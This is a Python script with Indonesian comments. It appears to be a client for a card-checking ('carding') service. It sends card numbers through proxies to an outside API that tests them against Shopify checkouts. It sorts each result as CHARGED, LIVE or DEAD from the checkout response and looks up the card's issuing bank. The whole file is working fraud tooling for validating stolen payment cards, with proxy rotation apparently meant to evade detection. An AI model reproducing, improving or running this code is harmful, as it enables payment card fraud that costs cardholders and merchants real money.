import aiohttp
import asyncio
import logging

# Setup logging
logger = logging.getLogger(__name__)

API_URL = "http://botspark.de1.octavia.id:25667/shopify"

# ============ KONFIGURASI ============
TIMEOUT_TOTAL = 120  # total timeout per request (detik)
TIMEOUT_CONNECT = 10  # timeout koneksi
TIMEOUT_READ = 60  # timeout baca data
MAX_RETRIES = 5  # jumlah percobaan ulang kalo error
RETRY_DELAY = 1  # delay antar retry (detik)
PROXY_CHECK_URL = "https://icanhazip.com/"

# ============ FUNGSI CEK PROXY ============
async def check_proxy(proxy: str) -> bool:
    """Cek apakah proxy hidup dengan test request ke checkip.amazonaws.com"""
    try:
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(PROXY_CHECK_URL, proxy=proxy, ssl=False) as resp:
                if resp.status == 200:
                    ip = await resp.text()
                    logger.debug(f"Proxy {proxy[:30]}... -> IP: {ip.strip()}")
                    return True
                return False
    except Exception as e:
        logger.debug(f"Proxy check failed: {e}")
        return False

# ============ FUNGSI CHECK SHOPIFY (DENGAN RETRY) ============
async def check_shopify(card: str, proxy: str = None) -> dict:
    """Check kartu ke API Shopify dengan retry mechanism"""
    params = {"cc": card, "sites": "auto"}
    if proxy:
        params["proxy"] = proxy
    
    timeout = aiohttp.ClientTimeout(
        total=TIMEOUT_TOTAL,
        connect=TIMEOUT_CONNECT,
        sock_read=TIMEOUT_READ
    )
    
    for attempt in range(MAX_RETRIES + 1):
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                logger.debug(f"Request ke API: {API_URL} (attempt {attempt+1})")
                async with session.get(API_URL, params=params) as resp:
                    if resp.status != 200:
                        logger.warning(f"HTTP {resp.status} untuk card {card[:12]}...")
                        return {"status": "ERROR", "raw": f"HTTP {resp.status}"}
                    
                    data = await resp.json()
                    logger.debug(f"Response diterima: {data.get('response', 'N/A')}")
                    return parse_response(data)
                    
        except asyncio.TimeoutError:
            logger.warning(f"Timeout attempt {attempt+1} untuk card {card[:12]}...")
            if attempt < MAX_RETRIES:
                await asyncio.sleep(RETRY_DELAY)
                continue
            return {"status": "ERROR", "raw": "Request timeout after 120 seconds"}
            
        except aiohttp.ClientError as e:
            logger.warning(f"Client error attempt {attempt+1}: {e}")
            if attempt < MAX_RETRIES:
                await asyncio.sleep(RETRY_DELAY)
                continue
            return {"status": "ERROR", "raw": str(e)}
            
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            return {"status": "ERROR", "raw": str(e)}
    
    return {"status": "ERROR", "raw": "Max retries exceeded"}

# ============ PARSE RESPONSE DARI API ============
def parse_response(data: dict) -> dict:
    """Parse response dari API Shopify"""
    amount = data.get("amount", "0")
    currency = data.get("currency", "USD")
    resp_text = data.get("response", "").upper()
    
    # Mapping status
    if "THANK YOU" in resp_text or "ORDER_PLACED" in resp_text:
        status = "CHARGED"
    elif "OTP_REQUIRED" in resp_text or "INSUFFICIENT_FUNDS" in resp_text:
        status = "LIVE"
    else:
        status = "DEAD"
    
    return {
        "status": status,
        "amount": amount,
        "currency": currency,
        "raw": data
    }

# ============ AMBIL INFO BIN ============
async def get_bin_info(cc_first6: str) -> dict:
    """Ambil info BIN dari bins.antipublic.cc"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{cc_first6}") as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "bank": data.get("bank", "Unknown"),
                        "country": data.get("country_name", "Unknown"),
                        "country_flag": data.get("country_flag", ""),
                        "brand": data.get("brand", "Unknown"),
                        "card_type": data.get("type", "Unknown"),
                        "level": data.get("level", data.get("type", "Unknown")),
                        "bank_url": data.get("bank_url", "")
                    }
    except Exception as e:
        logger.debug(f"BIN info failed for {cc_first6}: {e}")
    
    return {
        "bank": "Unknown",
        "country": "Unknown",
        "country_flag": "",
        "brand": "Unknown",
        "card_type": "Unknown",
        "level": "Unknown",
        "bank_url": ""
    }